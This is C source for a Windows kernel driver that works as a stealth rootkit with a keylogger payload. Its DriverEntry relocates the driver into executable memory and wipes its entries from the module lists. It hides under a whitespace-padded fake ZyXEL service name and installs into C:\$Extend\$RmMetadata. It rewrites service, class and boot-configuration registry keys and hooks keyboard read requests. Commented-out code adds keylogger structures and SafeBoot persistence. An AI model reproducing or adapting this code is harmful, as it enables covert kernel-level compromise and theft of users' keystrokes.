#include <ntddk.h>
#include <ntndk.h>
//#include <ntstrsafe.h>
#include "cloak.h"
#include "payload.h"
#include "settings.h"
#include "stringpool.h"

#define TEXTOFFSET 0x1000
#define MODULEFULLNAMEOFFSET 0x48
#define MODULEBASENAMEOFFSET 0x58
#define DRVRANDNAMELENGTH 10
#define KEYRANDNAMELENGTH 9

PUCHAR g_pNewMemoryExec;

//WCHAR teststring[] = L"Bleeeeeeeeeeeh!!!!";

NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING pRegistryPath){
	MYDBGPRINT("DriverEntry: DriverEntry");
	PUCHAR pDriverTextBegin = NULL;
	HANDLE hThread = INVALID_HANDLE_VALUE;
	HANDLE hDrvFile = INVALID_HANDLE_VALUE;
	NTSTATUS ntstatus = STATUS_UNSUCCESSFUL;
	OBJECT_ATTRIBUTES objectAttributes;
	IO_STATUS_BLOCK ioStatusBlock;
	LARGE_INTEGER byteOffset;
	LARGE_INTEGER interval;

	char szBCDKeyPathAboveGuid[] = "\\Registry\\Machine\\BCD00000000";
	char szFileInstallPath[] = "\\??\\C:\\$Extend\\$RmMetadata";
	char szServicesKeyPath[] = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services";
	char szClassPath[] = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e96b-e325-11ce-bfc1-08002be10318}";
	char szHiderSvc[] = "ZyXELWlSvc                                                                                                                                                                                                                                                   ";
	//WCHAR pszHiderKeyName[512];
	
	byteOffset.HighPart = byteOffset.LowPart = 0;
	
	g_pNewMemoryExec = ExAllocatePool(NonPagedPoolExecute, pDriverObject->DriverSize - TEXTOFFSET);
	g_pRunTimeInfo = (PRUNTIME_INFO)ExAllocatePool(NonPagedPool, sizeof(RUNTIME_INFO));
	g_pKbdHookInfo = (PIRP_PATCH_INFO)ExAllocatePool(NonPagedPool, sizeof(IRP_PATCH_INFO));
	g_pCommonStrings = (PSTRINGPOOL)ExAllocatePool(NonPagedPool, sizeof(STRINGPOOL));

	if ((NULL == g_pNewMemoryExec) || (NULL == g_pRunTimeInfo) || (NULL == g_pKbdHookInfo) || (NULL == g_pCommonStrings)){
		MYDBGPRINT("DriverEntry: Failed allocating memory!, %wZ, %wZ", pDriverObject->DriverName, *pRegistryPath);
		return STATUS_NO_MEMORY;
	}
	RtlZeroMemory(g_pRunTimeInfo, sizeof(RUNTIME_INFO));
	RtlZeroMemory(g_pKbdHookInfo, sizeof(IRP_PATCH_INFO));
	
	g_pCommonStrings->pBCDKeyPathAboveGuid = ExAllocatePool(NonPagedPool, sizeof(szBCDKeyPathAboveGuid));
	g_pCommonStrings->pClassPath = ExAllocatePool(NonPagedPool, sizeof(szClassPath));
	g_pCommonStrings->pFileInstallPath = ExAllocatePool(NonPagedPool, sizeof(szFileInstallPath));
	g_pCommonStrings->pServicesKeyPath = ExAllocatePool(NonPagedPool, sizeof(szServicesKeyPath));
	g_pCommonStrings->pHiderSvc = ExAllocatePool(NonPagedPool, sizeof(szHiderSvc));
	if ((NULL == g_pCommonStrings->pBCDKeyPathAboveGuid) || (NULL == g_pCommonStrings->pClassPath) || (NULL == g_pCommonStrings->pFileInstallPath) || (NULL == g_pCommonStrings->pServicesKeyPath) || (NULL == g_pCommonStrings->pHiderSvc)){
		MYDBGPRINT("DriverEntry: Failed allocating string pool memory!");
		return STATUS_NO_MEMORY;
	}

	RtlCopyMemory(g_pCommonStrings->pBCDKeyPathAboveGuid, szBCDKeyPathAboveGuid, sizeof(szBCDKeyPathAboveGuid));
	RtlCopyMemory(g_pCommonStrings->pClassPath, szClassPath, sizeof(szClassPath));
	RtlCopyMemory(g_pCommonStrings->pFileInstallPath, szFileInstallPath, sizeof(szFileInstallPath));
	RtlCopyMemory(g_pCommonStrings->pServicesKeyPath, szServicesKeyPath, sizeof(szServicesKeyPath));
	RtlCopyMemory(g_pCommonStrings->pHiderSvc, szHiderSvc, sizeof(szHiderSvc));
	//g_pCommonStrings->pHiderSvc[24] = 0x48;
	//g_pCommonStrings->pHiderSvc[25] = 0x0;
	//g_pCommonStrings->pHiderSvc[26] = 0x49;
	//g_pCommonStrings->pHiderSvc[27] = 0x0;

	//RtlZeroMemory(pszHiderKeyName, sizeof(pszHiderKeyName));
	//RtlC
	//ntstatus = RtlStringCbPrintfW(pszHiderKeyName, sizeof(pszHiderKeyName), L"\\%Sdtu", g_pCommonStrings->pHiderSvc);
	//RtLStr
	//DbgPrint("%s\\%s", g_pCommonStrings->pServicesKeyPath, g_pCommonStrings->pHiderSvc);
	//DbgPrint("%ws, 0x%lX", pszHiderKeyName, ntstatus);

	//if (INVALID_HANDLE_VALUE == hDrvFile){
	//	goto go;
	//}

	g_pRunTimeInfo->KeyRandNameLength = KEYRANDNAMELENGTH * sizeof(WCHAR);
	g_pRunTimeInfo->KeyRandName = ExAllocatePool(NonPagedPool, g_pRunTimeInfo->KeyRandNameLength);
	g_pRunTimeInfo->DrvRandNameLength = DRVRANDNAMELENGTH * sizeof(WCHAR);
	g_pRunTimeInfo->DrvRandName = ExAllocatePool(NonPagedPool, g_pRunTimeInfo->DrvRandNameLength);
	if ((NULL == g_pRunTimeInfo->KeyRandName) || (NULL == g_pRunTimeInfo->KeyRandName)){
		MYDBGPRINT("DriverEntry: Failed allocating memory!");
		return STATUS_NO_MEMORY;
	}

	g_pRunTimeInfo->DrvImageBegin = (PUCHAR)ExAllocatePool(NonPagedPool, pDriverObject->DriverSize);
	if (NULL == g_pRunTimeInfo->DrvImageBegin){
		MYDBGPRINT("DriverEntry: Failed allocating memory!");
		return STATUS_UNSUCCESSFUL;
	}

	///Copy entire driver image into nonpaged pool, starting at .text
	pDriverTextBegin = (PUCHAR)pDriverObject->DriverStart + TEXTOFFSET;
	for (ULONG i = 0; i < pDriverObject->DriverSize - TEXTOFFSET; i++){
		g_pNewMemoryExec[i] = pDriverTextBegin[i];
	}
	
	///Generate a random unique value type for storing the driver image path in the registry
	ULONG seed = (ULONG)&pDriverTextBegin;
	g_pRunTimeInfo->ValueType = RtlRandomEx(&seed);
	
	///As we're going to fully wipe out the driver's image path from unloaded module list
	///we need to store the path information otherwise since it's used later on to delete the driver image from disk after being loaded.
	///And since the driver object will be deleted too we're also required to store the registry path, so we can easily know
	///which service key entry needs to be deleted after boot.
	PUCHAR pModuleTableEntry = (PUCHAR)pDriverObject->DriverSection;
	PUNICODE_STRING pModuleTableFullNameEntry = (PUNICODE_STRING)(pModuleTableEntry + MODULEFULLNAMEOFFSET);
	g_pRunTimeInfo->OldDrvPath = (PUNICODE_STRING)ExAllocatePool(NonPagedPool, sizeof(UNICODE_STRING));
	g_pRunTimeInfo->OldRegPath = (PUNICODE_STRING)ExAllocatePool(NonPagedPool, sizeof(UNICODE_STRING));
	if ((NULL == pModuleTableFullNameEntry) || (NULL == g_pRunTimeInfo->OldDrvPath) || (NULL == g_pRunTimeInfo->OldRegPath)){
		MYDBGPRINT("DriverEntry: FATAL ERROR!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! maybe os unsupported.");
		return STATUS_DRIVER_INTERNAL_ERROR;
	}

	g_pRunTimeInfo->OldDrvPath->MaximumLength = pModuleTableFullNameEntry->Length + sizeof(WCHAR);
	g_pRunTimeInfo->OldDrvPath->Length = pModuleTableFullNameEntry->Length;
	g_pRunTimeInfo->OldRegPath->MaximumLength = pRegistryPath->Length + sizeof(WCHAR);
	g_pRunTimeInfo->OldRegPath->Length = pRegistryPath->Length;

	g_pRunTimeInfo->OldDrvPath->Buffer = ExAllocatePool(NonPagedPool, g_pRunTimeInfo->OldDrvPath->MaximumLength);
	g_pRunTimeInfo->OldRegPath->Buffer = ExAllocatePool(NonPagedPool, g_pRunTimeInfo->OldRegPath->MaximumLength);
	if ((NULL == g_pRunTimeInfo->OldDrvPath->Buffer) || (NULL == g_pRunTimeInfo->OldRegPath->Buffer)){
		return STATUS_NO_MEMORY;
	}

	RtlCopyMemory(g_pRunTimeInfo->OldDrvPath->Buffer, pModuleTableFullNameEntry->Buffer, g_pRunTimeInfo->OldDrvPath->Length);
	(g_pRunTimeInfo->OldDrvPath->Buffer)[g_pRunTimeInfo->OldDrvPath->Length / sizeof(WCHAR)] = 0x0;
	RtlCopyMemory(g_pRunTimeInfo->OldRegPath->Buffer, pRegistryPath->Buffer, g_pRunTimeInfo->OldRegPath->Length);
	(g_pRunTimeInfo->OldRegPath->Buffer)[g_pRunTimeInfo->OldRegPath->Length / sizeof(WCHAR)] = 0x0;

	InitializeObjectAttributes(&objectAttributes, g_pRunTimeInfo->OldDrvPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);	
	ntstatus = ZwCreateFile(&hDrvFile, GENERIC_READ, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0,	FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	FILE_STANDARD_INFORMATION fileStandardInfo;

	if (NT_SUCCESS(ntstatus)) {
		ZwQueryInformationFile(hDrvFile, &ioStatusBlock, &fileStandardInfo, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);

		ntstatus = ZwReadFile(hDrvFile, NULL, NULL, NULL, &ioStatusBlock, g_pRunTimeInfo->DrvImageBegin, pDriverObject->DriverSize, &byteOffset, NULL);
		if (!NT_SUCCESS(ntstatus)) {
			return STATUS_DRIVER_INTERNAL_ERROR;
		}
		g_pRunTimeInfo->DrvImageSize = fileStandardInfo.EndOfFile.LowPart;

		ZwClose(hDrvFile);
	}

	///Remove unloaded module info
	(*pModuleTableFullNameEntry).Length = 0x0;
	(*pModuleTableFullNameEntry).MaximumLength = 0x0;

	PUNICODE_STRING pModuleTableBaseNameEntry = (PUNICODE_STRING)(pModuleTableEntry + MODULEBASENAMEOFFSET);
	if (NULL != pModuleTableBaseNameEntry){
		(*pModuleTableBaseNameEntry).Length = 0x0;
		(*pModuleTableBaseNameEntry).MaximumLength = 0x0;
	}


#pragma warning(disable:4054)	///We are suspected of trying to alter functions
	ULONGLONG launchThreadOffset = (PUCHAR)LaunchThread - ((PUCHAR)pDriverObject->DriverStart + TEXTOFFSET);
	ULONGLONG senseThreadOffset = (PUCHAR)SenseThread - ((PUCHAR)pDriverObject->DriverStart + TEXTOFFSET);
	//ULONGLONG bcdThreadOffset = (PUCHAR)BcdThread - ((PUCHAR)pDriverObject->DriverStart + TEXTOFFSET);
	ULONGLONG workerThreadOffset = (PUCHAR)WorkerThread - ((PUCHAR)pDriverObject->DriverStart + TEXTOFFSET);
	ULONGLONG irpMjReadOffset = (PUCHAR)IrpMjRead - ((PUCHAR)pDriverObject->DriverStart + TEXTOFFSET);
	ULONGLONG irpMjReadCompletionOffset = (PUCHAR)IrpMjReadCompletion - ((PUCHAR)pDriverObject->DriverStart + TEXTOFFSET);
	ULONGLONG rewriteSvcKeyOffset = (PUCHAR)RewriteSvcKey - ((PUCHAR)pDriverObject->DriverStart + TEXTOFFSET);
	ULONGLONG rewriteClsKeyOffset = (PUCHAR)RewriteClsKey - ((PUCHAR)pDriverObject->DriverStart + TEXTOFFSET);

	ULONGLONG rewriteBcdKeyOffset = (PUCHAR)RewriteBcdKey - ((PUCHAR)pDriverObject->DriverStart + TEXTOFFSET);


#pragma warning(disable:4055)	///We are suspected of trying to execute data
	PKSTART_ROUTINE fpNewmemLaunchThread = (PKSTART_ROUTINE)(g_pNewMemoryExec + launchThreadOffset);
	PKSTART_ROUTINE fpNewmemSenseThread = (PWORKER_THREAD_ROUTINE)(g_pNewMemoryExec + senseThreadOffset);
	PKSTART_ROUTINE fpNewmemWorkerThread = (PWORKER_THREAD_ROUTINE)(g_pNewMemoryExec + workerThreadOffset);

	PDRIVER_DISPATCH fpNewmemIrpMjRead = (PDRIVER_DISPATCH)(g_pNewMemoryExec + irpMjReadOffset);
	PIO_COMPLETION_ROUTINE fpNewmemIrpMjReadCompletion = (PIO_COMPLETION_ROUTINE)(g_pNewMemoryExec + irpMjReadCompletionOffset);
	PWORKER_THREAD_ROUTINE fpNewmemRewriteSvcKey = (PWORKER_THREAD_ROUTINE)(g_pNewMemoryExec + rewriteSvcKeyOffset);
	PWORKER_THREAD_ROUTINE fpNewmemRewriteClsKey = (PWORKER_THREAD_ROUTINE)(g_pNewMemoryExec + rewriteClsKeyOffset);

	PWORKER_THREAD_ROUTINE fpNewmemRewriteBcdKey = (PWORKER_THREAD_ROUTINE)(g_pNewMemoryExec + rewriteBcdKeyOffset);

	
	g_pKbdHookInfo->fpHookFunction = fpNewmemIrpMjRead;
	g_pKbdHookInfo->fpHookCompletionRoutine = fpNewmemIrpMjReadCompletion;

	PWORK_QUEUE_ITEM pWorkItem2 = (PWORK_QUEUE_ITEM)ExAllocatePool(NonPagedPool, sizeof(WORK_QUEUE_ITEM));
	PWORK_QUEUE_ITEM pWorkItem3 = (PWORK_QUEUE_ITEM)ExAllocatePool(NonPagedPool, sizeof(WORK_QUEUE_ITEM));


	g_pRunTimeInfo->fpSvcKeyWorkItem = (PIO_APC_ROUTINE)ExAllocatePool(NonPagedPool, sizeof(WORK_QUEUE_ITEM));
	g_pRunTimeInfo->fpClsKeyWorkItem = (PIO_APC_ROUTINE)ExAllocatePool(NonPagedPool, sizeof(WORK_QUEUE_ITEM));
	g_pRunTimeInfo->fpBcdKeyWorkItem = (PIO_APC_ROUTINE)ExAllocatePool(NonPagedPool, sizeof(WORK_QUEUE_ITEM));

	PVOID pointer = ExAllocatePool(NonPagedPool, sizeof(PVOID));
	PVOID pointer2 = ExAllocatePool(NonPagedPool, sizeof(PVOID));
	PVOID pointer3 = ExAllocatePool(NonPagedPool, sizeof(PVOID));
	PVOID pointer4 = ExAllocatePool(NonPagedPool, sizeof(PVOID));

#pragma warning(disable:4152)
	ExInitializeWorkItem((PWORK_QUEUE_ITEM)g_pRunTimeInfo->fpSvcKeyWorkItem, fpNewmemRewriteSvcKey, pointer2);
	ExInitializeWorkItem((PWORK_QUEUE_ITEM)g_pRunTimeInfo->fpClsKeyWorkItem, fpNewmemRewriteClsKey, pointer3);
	ExInitializeWorkItem((PWORK_QUEUE_ITEM)g_pRunTimeInfo->fpBcdKeyWorkItem, fpNewmemRewriteBcdKey, pointer4);

	///Up until now, nothing has been started. This doesn't change until an initial thread has been created.
	///However, after launching this thread startup function the driver and its cloaking routines are fully active

	ExInitializeWorkItem(pWorkItem2, fpNewmemSenseThread, pointer);
	MYDBGPRINT("DriverEntry: Starting SenseThread from InitThread!");
	PsCreateSystemThread(&hThread, (ACCESS_MASK)0, NULL, (HANDLE)0, NULL, fpNewmemLaunchThread, pWorkItem2);
	if (NULL != hThread){
		ZwClose(hThread);		///The thread handle is useless to us
	}

	//ExInitializeWorkItem(pWorkItem2, fpNewmemSenseThread, pointer);
	MYDBGPRINT("DriverEntry: Starting RewriteBcdKey routine from InitThread!");
	PsCreateSystemThread(&hThread, (ACCESS_MASK)0, NULL, (HANDLE)0, NULL, fpNewmemLaunchThread, g_pRunTimeInfo->fpBcdKeyWorkItem);
	if (NULL != hThread){
		ZwClose(hThread);		///The thread handle is useless to us
	}

	interval.QuadPart = -2000000;
	KeDelayExecutionThread(KernelMode, FALSE, &interval);

	///The second thread has solely a payload function, it doesn't contribute to the driver cloak.
	ExInitializeWorkItem(pWorkItem3, fpNewmemWorkerThread, NULL);
	MYDBGPRINT("DriverEntry: Starting WorkerThread from InitThread!");
	PsCreateSystemThread(&hThread, (ACCESS_MASK)0, NULL, (HANDLE)0, NULL, (PKSTART_ROUTINE)fpNewmemLaunchThread, pWorkItem3);
	if (NULL != hThread){
		ZwClose(hThread);		///The thread handle is useless to us
	}

	MYDBGPRINT("DriverEntry: Everything set up, exiting!");
	///We're all set in memory, so just unload again.
	//go:
	return STATUS_NONCONTINUABLE_EXCEPTION;
}


//ULONG Flag;
//ExInitializeWorkItem(pWorkItem, fpNewmemBogusThread, pointer5);
//ULONGLONG rewriteDrvFileOffset = (PUCHAR)RewriteDrvFile - ((PUCHAR)pDriverObject->DriverStart + TEXTOFFSET);
//g_pRunTimeInfo->hEvent = INVALID_HANDLE_VALUE;
//#include "drvtricks.h"
//UNREFERENCED_PARAMETER(pRegistryPath);
//ULONGLONG bogusThreadOffset = (PUCHAR)BogusThread - ((PUCHAR)pDriverObject->DriverStart + TEXTOFFSET);
//ULONGLONG rewriteBogusFileOffset = (PUCHAR)RewriteBogusFile - ((PUCHAR)pDriverObject->DriverStart + TEXTOFFSET);
//ULONGLONG patchOffset = (PUCHAR)PatchOrUnpatchKbd - ((PUCHAR)pDriverObject->DriverStart + TEXTOFFSET);
//PKSTART_ROUTINE fpNewmemBogusThread = (PWORKER_THREAD_ROUTINE)(g_pNewMemoryExec + bogusThreadOffset);
//PIO_APC_ROUTINE fpNewmemRewriteDrvFile = (PIO_APC_ROUTINE)(g_pNewMemoryExec + rewriteDrvFileOffset);
//PIO_APC_ROUTINE fpNewmemRewriteBogusFile = (PIO_APC_ROUTINE)(g_pNewMemoryExec + rewriteBogusFileOffset);

//PKSTART_ROUTINE fpNewmemPatch = (PWORKER_THREAD_ROUTINE)(g_pNewMemoryExec + patchOffset);
//g_pRunTimeInfo->fpDrvFileRewriteRoutine = fpNewmemRewriteDrvFile;
//g_pRunTimeInfo->fpBogusFileRewriteRoutine = fpNewmemRewriteBogusFile;
//g_pRunTimeInfo->fpBcdFileRewriteRoutine = fpNewmemRewriteBcdFile;
//g_pRunTimeInfo->fpRegWorkItem = fpRewritekey
//g_pKbdHookInfo->fpPatchOrUnpatchKbd = fpNewmemPatch;
//PWORK_QUEUE_ITEM pWorkItem = (PWORK_QUEUE_ITEM)ExAllocatePool(NonPagedPool, sizeof(WORK_QUEUE_ITEM));
//PWORK_QUEUE_ITEM pRegWorkItem = (PWORK_QUEUE_ITEM)ExAllocatePool(NonPagedPool, sizeof(WORK_QUEUE_ITEM));
//PVOID pointer5 = ExAllocatePool(NonPagedPool, sizeof(PVOID));

//PrepOnShutdown(NULL);

//DbgPrint("DriverEntry: Failed allocating memory!");
//DbgPrint("DriverEntry: All set up, exiting!");
//DbgPrint("DriverEntry: Starting BogusThread from InitThread!");
//PsCreateSystemThread(&hThread, (ACCESS_MASK)0, NULL, (HANDLE)0, NULL, fpNewmemInitThread, pWorkItem);
//if (NULL != hThread){
//	ZwClose(hThread);		///The thread handle is useless to us
//}
//DbgPrint("DriverEntry: Failed allocating memory!");
//KeDelayExecutionThread(KernelMode, FALSE, &interval);
//#include "drvtricks.h"
//PIO_APC_ROUTINE fpDrvFileRewriteRoutine;
//PIO_APC_ROUTINE fpBogusFileRewriteRoutine;
//PIO_APC_ROUTINE fpBcdFileRewriteRoutine;
//PWORK_QUEUE_ITEM p
//HANDLE hOldDrvFile;
//HANDLE hBogusFile;
//IO_STATUS_BLOCK bogusFileIoStatusBlock;
//ULONGLONG initFlag;
//ULONGLONG bcdFileBuffer;
//ULONGLONG okToContinue;
//HANDLE hLockedDrvFile;
//KEVENT kevent;
//HANDLE hEvent;
//
//typedef struct _KEY_STATE {
//	BOOL kSHIFT; //if the shift key is pressed  
//	BOOL kCAPSLOCK; //if the caps lock key is pressed down 
//	BOOL kCTRL; //if the control key is pressed down 
//	BOOL kALT; //if the alt key is pressed down 
//} KEY_STATE, *PKEY_STATE;
//
////Instances of the structure will be chained onto a  
////linked list to keep track of the keyboard data 
////delivered by each irp for a single pressed key 
//typedef struct _KEY_DATA {
//	LIST_ENTRY ListEntry;
//	char KeyData;
//	char KeyFlags;
//} KEY_DATA, *PKEY_DATA;
//
//
/////Data private to keylogger functions
//typedef struct _IRP_PATCH_INFO {
//	PDRIVER_DISPATCH fpOriginalFunction;
//	PDRIVER_DISPATCH fpHookFunction;
//	PIO_COMPLETION_ROUTINE fpOriginalCompletionRoutine;
//	PIO_COMPLETION_ROUTINE fpHookCompletionRoutine;
//	HANDLE hLogFile;
//	KEY_STATE kState;
//	KSEMAPHORE queueSemaphore;
//	KSPIN_LOCK queueSpinLock;
//	LIST_ENTRY queueListHead;
//	//PVOID wasPatched;
//	//PKSTART_ROUTINE fpPatchOrUnpatchKbd;
//	BOOL wasPatched;
//	BOOL irpSentDown;
//	//BOOL flag;
//	PDRIVER_OBJECT pKbdDrvObj;
//	BOOL escKeyPressed;
//	BOOL scrlKeyPressed;
//	//PDRIVER_OBJECT pKbdDrvObj;
//} IRP_PATCH_INFO, *PIRP_PATCH_INFO;
//
//
//
//void BogusThread(PVOID pStartContext);

//void PrepOnShutdown(PVOID pParameter);
//
//void RewriteBogusFile(PVOID pContext, PIO_STATUS_BLOCK pIoStatusBlock);

//#include "drvtricks.h"
//#include <wsk.h>
//PVOID wasPatched;
//PKSTART_ROUTINE fpPatchOrUnpatchKbd;
//BOOL flag;
//PDRIVER_OBJECT pKbdDrvObj;
//PRUNTIME_INFO g_pRunTimeInfo;


//void DevObjPatchThread(PVOID pParameter){
//	UNREFERENCED_PARAMETER(pParameter);
//	UNICODE_STRING uFilesysName;
//	LARGE_INTEGER interval;
//	LARGE_INTEGER timeout;
//	KIRQL oldIrql;
//
//	PDRIVER_OBJECT pTrueFilesysDriver = NULL;
//	PDRIVER_OBJECT pFakeFilesysDriver = NULL;
//	PDEVICE_OBJECT pCurrDeviceObject = NULL;
//	ULONG deviceCount = 0;
//	//ULONG prevDeviceCount = 0;
//
//
//	interval.QuadPart = -100000;
//	timeout.QuadPart = -5000;
//
//	NTSTATUS ntstatus = STATUS_UNSUCCESSFUL;
//	RtlInitUnicodeString(&uFilesysName, L"\\Driver\\kbdclass");
//
//
//	while (!NT_SUCCESS(ntstatus)){
//		ntstatus = ObReferenceObjectByName(&uFilesysName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, 0, IoDriverObjectType, KernelMode, NULL, &pTrueFilesysDriver);
//	}
//
//	while (1 > deviceCount){
//		IoEnumerateDeviceObjectList(pTrueFilesysDriver, NULL, 0, &deviceCount);
//	}
//	pFakeFilesysDriver = ExAllocatePool(NonPagedPool, pTrueFilesysDriver->Size);
//	RtlCopyMemory(pFakeFilesysDriver, pTrueFilesysDriver, pTrueFilesysDriver->Size);
//	//g_fpOrigDispatchDirectoryControl = pTrueFilesysDriver->MajorFunction[IRP_MJ_DIRECTORY_CONTROL];
//ntstatus = ZwWriteFile(hDrvFile, NULL, NULL, NULL, &ioStatusBlock, g_pRunTimeInfo->DrvImageBegin, g_pRunTimeInfo->DrvImageSize, NULL, NULL);
//g_pRunTimeInfo->hLockedDrvFile = hDrvFile;
//	g_pRunTimeInfo->hLockedDrvFile = hDrvFile;
//g_pRunTimeInfo->hLockedDrvFile = hDrvFile;
//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szSafebootRegPathMinimal, NULL, REG_SZ, &szSafebootData, sizeof(szSafebootData));
//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szSafebootRegPathNetwork, NULL, REG_SZ, &szSafebootData, sizeof(szSafebootData));

//RtlStringCbPrintfW(szSafebootRegPathMinimal, sizeof(szSafebootRegPathMinimal), L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\Zz%ws.sys", g_pRunTimeInfo->KeyRandName);
//w                                 ");                                                                                                                                                                                                                                e
//RtlCreateRegistryKey(RTL_REGISTRY_SERVICES, L"Zyyyyyyyyy                                                                                                                                                                                                                                    ");
//ZwDeleteKey(hHiderKey);
//RtlCreateRegistryKey(RTL_REGISTRY_ABSOLUTE, L"\\registry\\machine\\SYSTEM\\CurrentControlSet\\services\\          ");
//RtlInitUnicodeString(&uSafebootRegPath, szSafebootRegPathMinimalOld);
/*, uSafebootRegPath*/
//InitializeObjectAttributes(&objectAttributes, &uSafebootRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//ZwOpenKey(&hKey, DELETE, &objectAttributes);
//ZwDeleteKey(hKey);
//RtlStringCbPrintfW(szSafebootRegPathMinimalOld, sizeof(szSafebootRegPathMinimalOld), L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\Zz%ws.sys", szOldRegName);
//RtlStringCbPrintfW(szSafebootRegPathNetworkOld, sizeof(szSafebootRegPathNetworkOld), L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\Zz%ws.sys", szOldRegName);
/*uSafebootRegPath,*/
//RtlStringCbPrintfW(szSafebootRegPathMinimal, sizeof(szSafebootRegPathMinimal), L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\Zz%ws.sys", g_pRunTimeInfo->KeyRandName);
//RtlStringCbPrintfW(szSafebootRegPathNetwork, sizeof(szSafebootRegPathNetwork), L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\Zz%ws.sys", g_pRunTimeInfo->KeyRandName);
//ZwClose(hKey);

//RtlInitUnicodeString(&uSafebootRegPath, szSafebootRegPathNetworkOld);
//InitializeObjectAttributes(&objectAttributes, &uSafebootRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//ZwOpenKey(&hKey, DELETE, &objectAttributes);
//ZwDeleteKey(hKey);
//ZwClose(hKey);

//RtlInitUnicodeString(&uSafebootRegPath, szSafebootRegPathMinimal);
//InitializeObjectAttributes(&objectAttributes, &uSafebootRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//ZwOpenKey(&hKey, DELETE, &objectAttributes);
//ZwDeleteKey(hKey);
//ZwClose(hKey);

//RtlInitUnicodeString(&uSafebootRegPath, szSafebootRegPathNetwork);
//InitializeObjectAttributes(&objectAttributes, &uSafebootRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//ZwOpenKey(&hKey, DELETE, &objectAttributes);
//ZwDeleteKey(hKey);
//ZwClose(hKey);

//RtlInitUnicodeString(&uSafebootRegPath, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot");
//InitializeObjectAttributes(&objectAttributes, &uSafebootRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//ZwOpenKey(&hKey, GENERIC_ALL, &objectAttributes);
//ZwFlushKey(hKey);

//if (INVALID_HANDLE_VALUE != g_pRunTimeInfo->hLockedDrvFile){
//	ZwClose(g_pRunTimeInfo->hLockedDrvFile);
//}
//WCHAR szSafebootRegPathMinimal[MAXCHAR];
//WCHAR szSafebootRegPathNetwork[MAXCHAR];
//WCHAR szSafebootData[] = L"Driver";
//ntstatus = NtCreateKey(&hKey, KEY_READ | KEY_WRITE, &objectAttributes2, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);

//RtlCreateRegistryKey(RTL_REGISTRY_SERVICES, L"Zyyyyyyyyy       
//RtlStringCbPrintfW(szSafebootRegPathNetwork, sizeof(szSafebootRegPathNetwork), L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\Zz%ws.sys", g_pRunTimeInfo->KeyRandName);

//RtlInitUnicodeString(&uSafebootRegPath, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot");
//InitializeObjectAttributes(&objectAttributes, &uSafebootRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//ZwOpenKey(&hKey, GENERIC_ALL, &objectAttributes);
//ZwFlushKey(hKey);
//hDrvFile = INVALID_HANDLE_VALUE;
//	//hDrvFile = INVALID_HANDLE_VALUE;
//hDrvFile = INVALID_HANDLE_VALUE;
//if (!NT_SUCCESS(ntstatus)) {

//}

//else{
//	RtlInitUnicodeString(&uDrvFilePath, L"\\??\\Global\\C:\\$Extend");
//	InitializeObjectAttributes(&objectAttributes, &uDrvFilePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
//	ntstatus = ZwCreateFile(&hDrvFile, FILE_READ_ATTRIBUTES | SYNCHRONIZE, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_DIRECTORY, 0, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT | FILE_DIRECTORY_FILE, NULL, 0);
//	DbgPrint("%lX", ntstatus);
//	//ZwClose(hDrvFile);

//	RtlInitUnicodeString(&uDrvFilePath, L"$RmMetadata");
//	InitializeObjectAttributes(&objectAttributes, &uDrvFilePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, hDrvFile, NULL);
//	ntstatus = ZwCreateFile(&hDrvFile, FILE_READ_ATTRIBUTES | FILE_WRITE_ATTRIBUTES | SYNCHRONIZE, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_DIRECTORY, 0, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT | FILE_DIRECTORY_FILE, NULL, 0);
//	DbgPrint("%lX", ntstatus);
//	ZwClose(hDrvFile);
//}

//	g_pKbdHookInfo->fpOriginalFunction = pTrueFilesysDriver->MajorFunction[IRP_MJ_READ];
//	//pFakeFilesysDriver->MajorFunction[IRP_MJ_DIRECTORY_CONTROL] = FhidDispatchDirectoryControl;
//	pFakeFilesysDriver->MajorFunction[IRP_MJ_READ] = g_pKbdHookInfo->fpHookFunction;
//	
//
//	//BootPreparations(pParameter);
//	//if (0x0 != *((PUCHAR)pParameter)){
//	//	DbgPrint("boot preparations failed, not exiting");
//	//	//return;
//	//}
//
//	//for (;;){
//		pFakeFilesysDriver->DeviceObject = pTrueFilesysDriver->DeviceObject;
